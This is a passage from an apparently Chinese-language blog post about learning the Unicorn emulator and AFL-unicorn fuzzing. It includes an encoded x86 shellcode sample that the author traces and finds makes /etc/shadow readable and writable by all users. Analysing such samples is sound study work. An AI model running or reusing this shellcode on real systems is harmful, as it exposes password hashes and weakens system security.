class="string">b"\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80"</span></span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, shellcode)</span><br><span class="line">mu.reg_write(UC_X86_REG_ESP, STACK_ADDR + STACK_SIZE<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    <span class="comment"># print('&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size))</span></span><br><span class="line">    code = mu.mem_read(address,size)</span><br><span class="line">    <span class="comment"># print(code)</span></span><br><span class="line">    <span class="keyword">if</span> code == <span class="string">b"\xcd\x80"</span>:</span><br><span class="line">        print(<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line">        eax = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line">        ebx = mu.reg_read(UC_X86_REG_EBX)</span><br><span class="line">        ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">        edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">        print(<span class="string">"&#123;&#125;: &#123;&#125; &#123;&#125; &#123;&#125;"</span>.format(eax,ebx,ecx,edx))</span><br><span class="line">        <span class="keyword">if</span>(eax == <span class="number">15</span>):</span><br><span class="line">            file_name = bytes(mu.mem_read(ebx,<span class="number">32</span>)).split(<span class="string">b'\x00'</span>)[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">"file_name is &#123;&#125;"</span>.format(file_name))</span><br><span class="line">        mu.reg_write(UC_X86_REG_EIP, address+size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(BASE,BASE+len(shellcode))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unicorn$ python3 sc.py</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x40006b, instruction size &#x3D; 0x2</span><br><span class="line">15: 4194392 438 0</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x400070, instruction size &#x3D; 0x2</span><br><span class="line">1: 4194392 438 0</span><br></pre></td></tr></table></figure><p>打开系统调用的解释网站对照看一下。<br><a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">https://syscalls.kernelgrok.com/</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-152242.png" alt=""></p><p>查了一下chmod命令可以使用八进制数来指定权限。所以438就是666，代表读写权限。</p><p>hex(4194392)-&gt;’0x400058’,是一个指针，指向的是文件名的字符串，把这个字符串取出来就知道到底读的是什么文件了。<br>这里吐个槽python3的mu.mem_read(ebx,32)返回一个bytearray，需要先bytes(xx)转成bytes，浪费了我半小时，另外bytes split要用b’xxx’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; Tracing instruction at 0x40006b, instruction size &#x3D; 0x2</span><br><span class="line">15: 4194392 438 0</span><br><span class="line">file_name is b&#39;&#x2F;etc&#x2F;shadow&#39;</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x400070, instruction size &#x3D; 0x2</span><br><span class="line">1: 4194392 438 0</span><br></pre></td></tr></table></figure><p>这样我们就知道这个shellcode其实是将/etc/shadow设置成可读可写。</p><h3 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h3><p>gcc function.c -m32 -o function.<br>调用super_function，返回的方式1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//get length</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *ptr = a;</span><br><span class="line">    <span class="keyword">while</span>(*ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr++;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//comparestrings</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i]!=b[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((stdcall))</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">super_function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a==<span class="number">5</span> &amp;&amp; !<span class="built_in">strcmp</span>(b, <span class="string">"batman"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    super_function(<span class="number">1</span>, <span class="string">"spiderman"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从前面的学习，我们已经学会了如何把程序加载进内存用unicorn仿真跑起来，和怎么用hook的方式去改变代码的执行流。<br>感觉解法很多…<br>分析一下题意，应该是指只调用super_function函数，而不执行代码的其他部分。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-04-135948.png" alt=""><br>假设基地址是0x08048000,那么要执行的就是0x08048000+0x57b-0x08048000+0x5b1</p><p>然后考虑32位传参，先看一下栈帧结构。<br>图来自CSAPP第二版。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-04-140207.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a==<span class="number">5</span> &amp;&amp; !<span class="built_in">strcmp</span>(b, <span class="string">"batman"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码可以看出，传入的参数a和b的值应为5和”batman”<br>从汇编代码最后的Ret 8可以看出来被调用者平衡堆栈，显然是stdcall调用约定。<br>stdcall的调用约定意味着参数从右向左压入堆栈。<br>当我们开始执行super_function的时候,esp是指向返回地址的。<br>所以a的值在esp+4,b的值在esp+8。（不理解的看图）<br>然后返回值会保存在eax里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line">BASE = <span class="number">0x8048000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line">string_addr = <span class="number">0x0</span></span><br><span class="line">mu.mem_write(string_addr, <span class="string">b"batman\x00"</span>)</span><br><span class="line">str = mu.mem_read(string_addr,<span class="number">6</span>)</span><br><span class="line">print(str)</span><br><span class="line">mu.mem_write(BASE, read(<span class="string">"./function"</span>))</span><br><span class="line">mu.reg_write(UC_X86_REG_ESP, STACK_ADDR + <span class="number">1024</span>)</span><br><span class="line">mu.mem_write(STACK_ADDR + <span class="number">1024</span> + <span class="number">4</span>, p32(<span class="number">5</span>))</span><br><span class="line">mu.mem_write(STACK_ADDR + <span class="number">1024</span> + <span class="number">8</span>, p32(string_addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    (<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line">    print(mu.mem_read(address,size))</span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(BASE+<span class="number">0x57b</span>,BASE+<span class="number">0x5b1</span>)</span><br><span class="line">reg = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line">print(reg)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-04-151947.png" alt=""></p><p>到这里我的unicorn学习就结束了，感觉大概熟悉了一下API和使用。<br>另外ghrida真的不好用。。我准备换回IDA了。</p><h2 id="AFL-unicorn学习"><a href="#AFL-unicorn学习" class="headerlink" title="AFL-unicorn学习"></a>AFL-unicorn学习</h2><p>先在sec.today上找一下资料<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-04-152457.png" alt=""><br><a href="https://medium.com/hackernoon/afl-unicorn-fuzzing-arbitrary-binary-code-563ca28936bf" target="_blank" rel="noopener">https://medium.com/hackernoon/afl-unicorn-fuzzing-arbitrary-binary-code-563ca28936bf</a></p><p>第一篇我就不赘述了，<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-023839.jpg" alt=""><br>稍微值得一提的就是这个图了，它使用AFL来mutate样本去生成数据，然后将数据读到一个固定的地址里，然后harness会从这个地址读取数据并运行要仿真的指令，如果出现crash，则模拟这个行为让harness崩溃，从而告知AFL crash发生，从而记录下crash样本。<br>harness基本上就是用了上面这些task里类似的方法去用unicorn把指令仿真执行起来，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">   Simple test harness for AFL's Unicorn Mode.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   This loads the simple_target.bin binary (precompiled as MIPS code) into</span></span><br><span class="line"><span class="string">   Unicorn's memory map for emulation, places the specified input into</span></span><br><span class="line"><span class="string">   simple_target's buffer (hardcoded to be at 0x300000), and executes 'main()'.</span></span><br><span class="line"><span class="string">   If any crashes occur during emulation, this script throws a matching signal</span></span><br><span class="line"><span class="string">   to tell AFL that a crash occurred.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Run under AFL as follows:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   $ cd &lt;afl_path&gt;/unicorn_mode/samples/simple/</span></span><br><span class="line"><span class="string">   $ ../../../afl-fuzz -U -m none -i ./sample_inputs -o ./output -- python simple_test_harness.py @@ </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.mips_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Path to the file containing the binary to emulate</span></span><br><span class="line">BINARY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), <span class="string">'simple_target.bin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Memory map for the code to be tested</span></span><br><span class="line">CODE_ADDRESS  = <span class="number">0x00100000</span>  <span class="comment"># Arbitrary address where code to test will be loaded</span></span><br><span class="line">CODE_SIZE_MAX = <span class="number">0x00010000</span>  <span class="comment"># Max size for the code (64kb)</span></span><br><span class="line">STACK_ADDRESS = <span class="number">0x00200000</span>  <span class="comment"># Address of the stack (arbitrarily chosen)</span></span><br><span class="line">STACK_SIZE    = <span class="number">0x00010000</span>  <span class="comment"># Size of the stack (arbitrarily chosen)</span></span><br><span class="line">DATA_ADDRESS  = <span class="number">0x00300000</span>  <span class="comment"># Address where mutated data will be placed</span></span><br><span class="line">DATA_SIZE_MAX = <span class="number">0x00010000</span>  <span class="comment"># Maximum allowable size of mutated data</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># If Capstone is installed then we'll dump disassembly, otherwise just dump the binary.</span></span><br><span class="line">    <span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">    cs = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 + CS_MODE_BIG_ENDIAN)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_instruction</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line">        mem = uc.mem_read(address, size)</span><br><span class="line">        <span class="keyword">for</span> (cs_address, cs_size, cs_mnemonic, cs_opstr) <span class="keyword">in</span> cs.disasm_lite(bytes(mem), size):</span><br><span class="line">            print(<span class="string">"    Instr: &#123;:#016x&#125;:\t&#123;&#125;\t&#123;&#125;"</span>.format(address, cs_mnemonic, cs_opstr))</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_instruction</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line">        print(<span class="string">"    Instr: addr=0x&#123;0:016x&#125;, size=0x&#123;1:016x&#125;"</span>.format(address, size))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_block</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line">    print(<span class="string">"Basic Block: addr=0x&#123;0:016x&#125;, size=0x&#123;1:016x&#125;"</span>.format(address, size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_mem_access</span><span class="params">(uc, access, address, size, value, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> access == UC_MEM_WRITE:</span><br><span class="line">        print(<span class="string">"        &gt;&gt;&gt; Write: addr=0x&#123;0:016x&#125; size=&#123;1&#125; data=0x&#123;2:016x&#125;"</span>.format(address, size, value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"        &gt;&gt;&gt; Read: addr=0x&#123;0:016x&#125; size=&#123;1&#125;"</span>.format(address, size))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_mem_invalid_access</span><span class="params">(uc, access, address, size, value, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> access == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        print(<span class="string">"        &gt;&gt;&gt; INVALID Write: addr=0x&#123;0:016x&#125; size=&#123;1&#125; data=0x&#123;2:016x&#125;"</span>.format(address, size, value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"        &gt;&gt;&gt; INVALID Read: addr=0x&#123;0:016x&#125; size=&#123;1&#125;"</span>.format(address, size))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_crash</span><span class="params">(uc_error)</span>:</span></span><br><span class="line">    <span class="comment"># This function should be called to indicate to AFL that a crash occurred during emulation.</span></span><br><span class="line">    <span class="comment"># Pass in the exception received from Uc.emu_start()</span></span><br><span class="line">    mem_errors = [</span><br><span class="line">        UC_ERR_READ_UNMAPPED, UC_ERR_READ_PROT, UC_ERR_READ_UNALIGNED,</span><br><span class="line">        UC_ERR_WRITE_UNMAPPED, UC_ERR_WRITE_PROT, UC_ERR_WRITE_UNALIGNED,</span><br><span class="line">        UC_ERR_FETCH_UNMAPPED, UC_ERR_FETCH_PROT, UC_ERR_FETCH_UNALIGNED,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">if</span> uc_error.errno <span class="keyword">in</span> mem_errors:</span><br><span class="line">        <span class="comment"># Memory error - throw SIGSEGV</span></span><br><span class="line">        os.kill(os.getpid(), signal.SIGSEGV)</span><br><span class="line">    <span class="keyword">elif</span> uc_error.errno == UC_ERR_INSN_INVALID:</span><br><span class="line">        <span class="comment"># Invalid instruction - throw SIGILL</span></span><br><span class="line">        os.kill(os.getpid(), signal.SIGILL)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># Not sure what happened - throw SIGABRT</span></span><br><span class="line">        os.kill(os.getpid(), signal.SIGABRT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"Test harness for simple_target.bin"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'input_file'</span>, type=str, help=<span class="string">"Path to the file containing the mutated input to load"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-d'</span>, <span class="string">'--debug'</span>, default=<span class="literal">False</span>, action=<span class="string">"store_true"</span>, help=<span class="string">"Enables debug tracing"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Instantiate a MIPS32 big endian Unicorn Engine instance</span></span><br><span class="line">    uc = Uc(UC_ARCH_MIPS, UC_MODE_MIPS32 + UC_MODE_BIG_ENDIAN)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.debug:</span><br><span class="line">        uc.hook_add(UC_HOOK_BLOCK, unicorn_debug_block)</span><br><span class="line">        uc.hook_add(UC_HOOK_CODE, unicorn_debug_instruction)</span><br><span class="line">        uc.hook_add(UC_HOOK_MEM_WRITE | UC_HOOK_MEM_READ, unicorn_debug_mem_access)</span><br><span class="line">        uc.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED | UC_HOOK_MEM_READ_INVALID, unicorn_debug_mem_invalid_access)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#---------------------------------------------------</span></span><br><span class="line">    <span class="comment"># Load the binary to emulate and map it into memory</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Loading data input from &#123;&#125;"</span>.format(args.input_file))</span><br><span class="line">    binary_file = open(BINARY_FILE, <span class="string">'rb'</span>)</span><br><span class="line">    binary_code = binary_file.read()</span><br><span class="line">    binary_file.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Apply constraints to the mutated input</span></span><br><span class="line">    <span class="keyword">if</span> len(binary_code) &gt; CODE_SIZE_MAX:</span><br><span class="line">        print(<span class="string">"Binary code is too large (&gt; &#123;&#125; bytes)"</span>.format(CODE_SIZE_MAX))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write the mutated command into the data buffer</span></span><br><span class="line">    uc.mem_map(CODE_ADDRESS, CODE_SIZE_MAX)</span><br><span class="line">    uc.mem_write(CODE_ADDRESS, binary_code)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set the program counter to the start of the code</span></span><br><span class="line">    start_address = CODE_ADDRESS          <span class="comment"># Address of entry point of main()</span></span><br><span class="line">    end_address   = CODE_ADDRESS + <span class="number">0xf4</span>   <span class="comment"># Address of last instruction in main()</span></span><br><span class="line">    uc.reg_write(UC_MIPS_REG_PC, start_address)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#-----------------</span></span><br><span class="line">    <span class="comment"># Setup the stack</span></span><br><span class="line"></span><br><span class="line">    uc.mem_map(STACK_ADDRESS, STACK_SIZE)</span><br><span class="line">    uc.reg_write(UC_MIPS_REG_SP, STACK_ADDRESS + STACK_SIZE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#-----------------------------------------------------</span></span><br><span class="line">    <span class="comment"># Emulate 1 instruction to kick off AFL's fork server</span></span><br><span class="line">    <span class="comment">#   THIS MUST BE DONE BEFORE LOADING USER DATA! </span></span><br><span class="line">    <span class="comment">#   If this isn't done every single run, the AFL fork server </span></span><br><span class="line">    <span class="comment">#   will not be started appropriately and you'll get erratic results!</span></span><br><span class="line">    <span class="comment">#   It doesn't matter what this returns with, it just has to execute at</span></span><br><span class="line">    <span class="comment">#   least one instruction in order to get the fork server started.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Execute 1 instruction just to startup the forkserver</span></span><br><span class="line">    print(<span class="string">"Starting the AFL forkserver by executing 1 instruction"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uc.emu_start(uc.reg_read(UC_MIPS_REG_PC), <span class="number">0</span>, <span class="number">0</span>, count=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"ERROR: Failed to execute a single instruction (error: &#123;&#125;)!"</span>.format(e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#-----------------------------------------------</span></span><br><span class="line">    <span class="comment"># Load the mutated input and map it into memory</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load the mutated input from disk</span></span><br><span class="line">    print(<span class="string">"Loading data input from &#123;&#125;"</span>.format(args.input_file))</span><br><span class="line">    input_file = open(args.input_file, <span class="string">'rb'</span>)</span><br><span class="line">    input = input_file.read()</span><br><span class="line">    input_file.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Apply constraints to the mutated input</span></span><br><span class="line">    <span class="keyword">if</span> len(input) &gt; DATA_SIZE_MAX:</span><br><span class="line">        print(<span class="string">"Test input is too long (&gt; &#123;&#125; bytes)"</span>.format(DATA_SIZE_MAX))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write the mutated command into the data buffer</span></span><br><span class="line">    uc.mem_map(DATA_ADDRESS, DATA_SIZE_MAX)</span><br><span class="line">    uc.mem_write(DATA_ADDRESS, input)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#------------------------------------------------------------</span></span><br><span class="line">    <span class="comment"># Emulate the code, allowing it to process the mutated input</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Executing until a crash or execution reaches 0x&#123;0:016x&#125;"</span>.format(end_address))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = 